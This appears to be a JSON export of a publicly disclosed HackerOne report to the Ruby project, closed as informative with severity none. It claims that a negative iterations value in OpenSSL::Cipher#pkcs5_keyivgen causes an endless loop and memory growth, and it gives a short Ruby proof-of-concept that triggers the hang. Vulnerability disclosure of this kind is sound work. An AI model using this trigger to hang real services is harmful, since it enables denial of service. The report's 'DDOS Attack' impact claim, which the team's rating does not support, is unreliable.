{
  "id": 304115,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDQxMTU=",
  "url": "https://hackerone.com/reports/304115",
  "title": "Integer Underflow @ ossl_cipher_pkcs5_keyivgen ",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "none",
  "readable_substate": "Informative",
  "created_at": "2018-01-11T20:55:21.152Z",
  "submitted_at": "2018-01-11T20:55:21.152Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "finb",
    "url": "/finb",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/116/607/e94dc1d2039dc6ca53eb72d1ef6991346ac4de29_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7724,
    "url": "https://hackerone.com/ruby",
    "handle": "ruby",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby",
      "twitter_handle": "",
      "website": "https://www.ruby-lang.org",
      "about": "A Programmer's Best Friend"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2018-02-23T07:18:57.620Z",
  "bug_reporter_agreed_on_going_public_at": "2018-01-12T13:38:42.880Z",
  "team_member_agreed_on_going_public_at": "2018-02-23T07:18:57.553Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Integer Underflow @ ossl_cipher_pkcs5_keyivgen \nfile : ext/openssl/ossl_cipher.c\naffected parameter: iterations\n\nINFO\nGenerates and sets the key/IV based on a password.\ncall-seq:\n```\ncipher.pkcs5_keyivgen(pass, salt = nil, iterations = 2048, digest = \"MD5\") -> nil\n```\n\n\nANALYSIS\niter(int) in ossl_cipher_pkcs5_keyivgen  which holds iterations value is not validated before use.\ntherefore passed on to openssl library function EVP_BytesToKey which loops over\niter(iterations) using count\n```\nfor (i = 1; i < (unsigned int)count; i++) {\n  if (!EVP_DigestInit_ex(c, md, NULL))\n  [code redacted]\n]\n```\nif count aka iterations is negative this loop runs forever and therefore causing \nruby to hang and eat up memory since allocation are performed during \nthis loop and \"i\" can never be greater than count\n\nPOC\n```\nrequire 'digest'\nrequire 'openssl'\nrequire 'base64'\n\ndata = 'abc'\nkey = '1234567887654321'\niv = key[0..7]\ncipher = OpenSSL::Cipher::Cipher.new('DES-EDE3-CBC') # or any other algorithm?\n\ncipher.encrypt\ncipher.pkcs5_keyivgen(key, iv, -1)\noutput = cipher.update(data)\noutput << cipher.final\n```\n\nCONFIGURATIONS\n./ruby -v\nruby 2.6.0dev (2018-01-11 trunk 61764) [x86_64-linux]\n\nopenssl version\nOpenSSL 1.0.1t  3 May 2016\n\n## Impact\n\nThis result in a DDOS Attack",
  "weakness": {
    "id": 16,
    "name": "Integer Underflow"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 0,
  "voters": [],
  "severity": {
    "rating": "none",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
